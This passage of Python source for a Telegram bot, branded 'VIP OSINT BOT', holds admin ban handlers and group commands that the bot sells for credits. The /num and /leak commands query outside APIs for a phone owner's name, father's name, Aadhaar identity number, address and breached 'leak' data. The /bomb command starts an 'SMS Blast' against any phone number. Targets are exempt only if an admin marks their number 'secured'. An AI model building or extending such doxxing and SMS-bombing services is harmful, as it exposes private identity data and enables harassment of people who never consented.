async def handle_unsecure_user_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    user_id = msg.text.strip()
    if not user_id.isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ! ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴏɴʟʏ ᴅɪɢɪᴛs."), parse_mode=PM)
        return
    
    if not is_user_secured(int(user_id)):
        await msg.answer(bq(f"❌ ᴜsᴇʀ {user_id} ɪs ɴᴏᴛ sᴇᴄᴜʀᴇᴅ!"), parse_mode=PM)
        await state.clear()
        return
    
    unsecure_user(int(user_id))
    await msg.answer(
        bq(f"✅ ᴜsᴇʀ {user_id} ᴜɴsᴇᴄᴜʀᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"),
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_BAN_USER)
async def rk_ban_user(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "🚫 ʙᴀɴ ᴜsᴇʀ\n\n"
            "ᴇɴᴛᴇʀ ᴛʜᴇ ᴜsᴇʀ ɪᴅ ᴛᴏ ʙᴀɴ:"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.ban_user)

@dp.message(AdminState.ban_user, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_ban_user_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    try:
        user_id = int(msg.text.strip())
    except:
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ! ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ɴᴜᴍʙᴇʀ."), parse_mode=PM)
        return
    
    if is_owner(user_id):
        await msg.answer(bq("❌ ᴄᴀɴ'ᴛ ʙᴀɴ ᴏᴡɴᴇʀ!"), parse_mode=PM)
        await state.clear()
        return
    
    u = get_user(user_id)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        await state.clear()
        return
    
    ban_user(user_id)
    await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_BAN}\">✅</tg-emoji> ᴜsᴇʀ {user_id} sᴜᴄᴄᴇssғᴜʟʟʏ ʙᴀɴɴᴇᴅ!"
        f"</blockquote>",
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_UNBAN_USER)
async def rk_unban_user(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "✅ ᴜɴʙᴀɴ ᴜsᴇʀ\n\n"
            "ᴇɴᴛᴇʀ ᴛʜᴇ ᴜsᴇʀ ɪᴅ ᴛᴏ ᴜɴʙᴀɴ:"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.unban_user)

@dp.message(AdminState.unban_user, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_unban_user_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    try:
        user_id = int(msg.text.strip())
    except:
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ! ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ɴᴜᴍʙᴇʀ."), parse_mode=PM)
        return
    
    u = get_user(user_id)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        await state.clear()
        return
    
    unban_user(user_id)
    await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_UNBAN}\">✅</tg-emoji> ᴜsᴇʀ {user_id} sᴜᴄᴄᴇssғᴜʟʟʏ ᴜɴʙᴀɴɴᴇᴅ!"
        f"</blockquote>",
        parse_mode=PM
    )
    await state.clear()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   Back to Admin
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message(F.text == BTN_BACK_ADMIN)
async def rk_back_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    
    if msg.chat.type != "private":
        return
    
    await state.clear()
    
    u = get_user(msg.from_user.id)
    mention = f"<a href='tg://user?id={msg.from_user.id}'>{u['full_name']}</a>"
    
    if is_owner(msg.from_user.id):
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
    else:
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(msg.from_user.id) else str(u['credits'])
    
    txt = (
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_WELCOME_LEAK}\">🥷</tg-emoji> <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐕𝐈𝐏 𝐎𝐒𝐈𝐍𝐓 𝐁𝐎𝐓 !!</b>\n\n"
        f"ʜᴇʏʏᴏ {mention} !!! <tg-emoji emoji-id=\"{EMOJI_WELCOME_WAVE}\">👋</tg-emoji>\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_WELCOME_CREDITS}\">💳</tg-emoji> ᴄʀᴇᴅɪᴛs: {credits_display}\n"
        f"ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ <tg-emoji emoji-id=\"{EMOJI_WELCOME_DOWN}\">👇</tg-emoji>\n"
        f"</blockquote>"
    )
    
    await send_dashboard_media(bot, msg.chat.id, "start", txt, main_kb(), parse_mode=PM)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   GROUP COMMANDS - /num /bomb /wal /give /take /leak
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def fetch_number_info(number: str):
    try:
        async with http_session.get(
            GET_INFO_API,
            params={"number": number, "key": GET_INFO_KEY},
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            if resp.status == 200:
                return await resp.json()
    except Exception as e:
        print(f"API Error: {e}")
    return None

def get_target_user_id(msg: Message) -> int:
    if msg.reply_to_message and msg.reply_to_message.from_user:
        return msg.reply_to_message.from_user.id
    return None

@dp.message(Command("num"))
async def cmd_get_info_group(msg: Message):
    if msg.chat.type == "private":
        return
    
    if not await check_force_joined_and_respond(msg):
        return
    
    target_uid = get_target_user_id(msg)
    if not target_uid:
        await msg.answer(bq("⚠️ Reply to a message or specify number"), parse_mode=PM)
        return
    
    u = get_user(target_uid)
    if not u:
        await msg.answer(bq("❌ User not found"), parse_mode=PM)
        return
    
    if is_owner(msg.from_user.id):
        can_use = True
    elif is_admin(msg.from_user.id):
        can_use = True
    elif is_premium(msg.from_user.id):
        can_use = u['credits'] >= GET_INFO_COST
    else:
        can_use = u['credits'] >= GET_INFO_COST
    
    if not can_use:
        await msg.answer(bq("❌ Insufficient credits"), parse_mode=PM)
        return
    
    parts = msg.text.strip().split()
    if len(parts) < 2:
        await msg.answer(bq("Usage: /num <phone>"), parse_mode=PM)
        return
    
    phone = parts[1]
    
    if is_number_secured(phone):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This number is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    await log_search(target_uid, msg.from_user.username or "", phone)
    
    proc = await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_PROCESSING}\">⏳</tg-emoji> Processing..."
        f"</blockquote>",
        parse_mode=PM
    )
    
    credits_deducted = False
    
    try:
        info = await fetch_number_info(phone)
        await proc.delete()
        
        if info and info.get("found"):
            if not is_owner(target_uid) and not is_admin(target_uid):
                deduct_credits(target_uid, GET_INFO_COST)
                credits_deducted = True
            
            response = (
                f"<blockquote>"
                f"📋 <b>Number Information</b>\n"
                f"──────────────────\n"
                f"📞 Number: {info.get('phone', 'N/A')}\n"
                f"👤 Name: {info.get('name', 'N/A')}\n"
                f"👨 Father: {info.get('father', 'N/A')}\n"
                f"🪪 Aadhaar: {info.get('aadhaar', 'N/A')}\n"
                f"🏠 Address: {info.get('address', 'N/A')}\n"
                f"📡 Circle: {info.get('circle', 'N/A')}\n"
                f"──────────────────\n"
                f"🤖 Pᴏᴡᴇʀᴇᴅ Bʏ: @ALLOSINTROBOT 🌟"
                f"</blockquote>"
            )
            await msg.answer(response, parse_mode=PM)
        else:
            await msg.answer(bq("❌ ɴᴏ ʀᴇᴄᴏʀᴅ ғᴏᴜɴᴅ. Cʀᴇᴅɪᴛs ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ."), parse_mode=PM)
            
    except Exception as e:
        await proc.delete()
        await msg.answer(bq(f"❌ Error: {str(e)[:100]}. Credits not deducted."), parse_mode=PM)
    
    if credits_deducted:
        u2 = get_user(target_uid)
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(target_uid) else str(u2['credits'])
        await msg.answer(
            bq(f"💳 ʀᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs: {credits_display}"),
            parse_mode=PM
        )

@dp.message(Command("leak"))
async def cmd_leak_group(msg: Message):
    if msg.chat.type == "private":
        return
    
    if not await check_force_joined_and_respond(msg):
        return
    
    target_uid = msg.from_user.id
    u = get_user(target_uid)
    if not u:
        await msg.answer(bq("❌ User not found"), parse_mode=PM)
        return
    
    if is_owner(msg.from_user.id):
        can_use = True
    elif is_admin(msg.from_user.id):
        can_use = True
    elif is_premium(msg.from_user.id):
        can_use = u['credits'] >= LEAK_COST
    else:
        can_use = u['credits'] >= LEAK_COST
    
    if not can_use:
        await msg.answer(bq("❌ Insufficient credits"), parse_mode=PM)
        return
    
    parts = msg.text.strip().split()
    if len(parts) < 2:
        await msg.answer(bq("Usage: /leak <+919876543210>"), parse_mode=PM)
        return
    
    number = parts[1]
    
    if not number.startswith("+91") and not number.startswith("91"):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> Invalid format! Please use format: +919876543210"
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    clean_number = number.replace("+", "")
    if not clean_number.isdigit() or len(clean_number) != 12:
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_INVALID}\">❌</tg-emoji> Invalid! Send a valid 12-digit number with +91 country code."
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    if is_number_secured(clean_number):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This number is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    await log_search(target_uid, msg.from_user.username or "", clean_number)
    
    proc = await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_PROCESSING}\">⏳</tg-emoji> Processing..."
        f"</blockquote>",
        parse_mode=PM
    )
    
    credits_deducted = False
    
    try:
        url = f"{LEAK_API_URL}?key={LEAK_API_KEY}&number={clean_number}"
        async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            data = await resp.json(content_type=None)
        
        await proc.delete()
        
        if data.get("success") and data.get("data", {}).get("status"):
            if not is_owner(target_uid) and not is_admin(target_uid):
                deduct_credits(target_uid, LEAK_COST)
                credits_deducted = True
            await msg.answer(
                format_leak_response(data, clean_number),
                parse_mode=PM
            )
        else:
            await msg.answer(
                bq("❌ No leak data found for this number. Credits not deducted."),
                parse_mode=PM
            )
            
    except Exception as e:
        await proc.delete()
        await msg.answer(
            bq(f"❌ Error: {str(e)[:100]}. Credits not deducted."),
            parse_mode=PM
        )
    
    if credits_deducted:
        u2 = get_user(target_uid)
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(target_uid) else str(u2['credits'])
        await msg.answer(
            bq(f"💳 ʀᴇᴍᴀɪɴɪɴɢ ᴄʀᴇᴅɪᴛs: {credits_display}"),
            parse_mode=PM
        )

@dp.message(Command("bomb"))
async def cmd_bomb_group(msg: Message):
    if msg.chat.type == "private":
        return
    
    if not await check_force_joined_and_respond(msg):
        return
    
    target_uid = msg.from_user.id
    u = get_user(target_uid)
    if not u:
        await msg.answer(bq("❌ User not found"), parse_mode=PM)
        return
    
    if not is_owner(target_uid) and not is_admin(target_uid):
        if u['credits'] < BLAST_COST:
            await msg.answer(bq("❌ Insufficient credits"), parse_mode=PM)
            return
    
    parts = msg.text.strip().split()
    if len(parts) < 2:
        await msg.answer(bq("Usage: /bomb <phone>"), parse_mode=PM)
        return
    
    phone = parts[1]
    
    if is_number_secured(phone):
        await msg.answer(
            f"<blockquote>"
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> This number is secured by admin!"
            f"</blockquote>",
            parse_mode=PM
        )
        return
    
    if not is_owner(target_uid) and not is_admin(target_uid):
        deduct_credits(target_uid, BLAST_COST)
    
    await log_search(target_uid, msg.from_user.username or "", phone)
    
    stop_btn = InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(
                text="🛑 STOP",
                callback_data=f"stop_bomb_{phone}",
            )
        ]]
    )
    
    response = (
        f"<blockquote>"
        f"💥 <b>SMS Blast Started</b>\n"
        f"──────────────────\n"
        f"📞 Number: {phone}\n"
        f"🔄 Round: 1\n"
        f"⏱️ Duration: Running...\n"
        f"⏳ Status: Processing\n"
        f"──────────────────\n"
        f"🤖 Pᴏᴡᴇʀᴇᴅ Bʏ: @ALLOSINTROBOT 🌟"
        f"</blockquote>"
    )
    
    msg_obj = await msg.answer(response, parse_mode=PM, reply_markup=stop_btn)
    db_set(f"blast_{phone}", str(int(time.time())))

@dp.callback_query(F.data.startswith("stop_bomb_"))
async def stop_bomb(cb: CallbackQuery):
    phone = cb.data.replace("stop_bomb_", "")
    db_set(f"blast_{phone}", "0")
    
    await cb.message.edit_text(
        bq("🛑 Blast stopped"),
        parse_mode=PM
    )
    await cb.answer("Blast stopped", show_alert=False)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   MAINTENANCE GUARD & LOG ALL MESSAGES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message()
async def global_guard(msg: Message):
    if db_get("maintenance","0") == "1" and not is_admin(msg.from_user.id):
        await msg.answer(
            bq("🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ\n\nBot is under maintenance. Please wait..."),
            parse_mode=PM
        )
        return
    
    if msg.text and not msg.text.startswith("/") and not msg.text.startswith("."):
        button_texts = [
            BTN_TG_BOMBER, BTN_GET_INFO, BTN_MY_PROFILE, BTN_REFER, BTN_SPIN, 
            BTN_BOMBER, BTN_REDEEM, BTN_LEAK, BTN_TG_TO_NUM, BTN_CUSTOM_BOMBER
        ]
        if msg.text not in button_texts:
            await log_search(msg.from_user.id, msg.from_user.username or "", msg.text)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              MAIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def main():
    global http_session
    init_db()

    # FIX: single long-lived aiohttp session — no per-request leak
    http_session = aiohttp.ClientSession()

    retry_delay = 5
    try:
        while True:
            try:
                print("✅ OsintBot started! Waiting for Telegram updates...")
                await dp.start_polling(bot)
                print("⚠️ Polling stopped. Reconnecting...")
                retry_delay = 5
            except (KeyboardInterrupt, SystemExit):
                # FIX: clean exit on SIGINT / explicit stop
                raise
            except asyncio.CancelledError:
                # FIX: hosting platforms send SIGTERM → CancelledError
                # Don't swallow it silently — re-raise to exit cleanly
                print("⚠️ CancelledError received — shutting down cleanly.")
                raise
            except Exception as exc:
                print(
                    f"⚠️ Polling error: {type(exc).__name__}: "
                    f"{str(exc)[:200]}. Retrying in {retry_delay}s..."
                )
            try:
                await asyncio.sleep(retry_delay)
            except asyncio.CancelledError:
                raise
            retry_delay = min(retry_delay * 2, 60)
    finally:
        # FIX: always close the shared session cleanly on any exit
        await http_session.close()
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
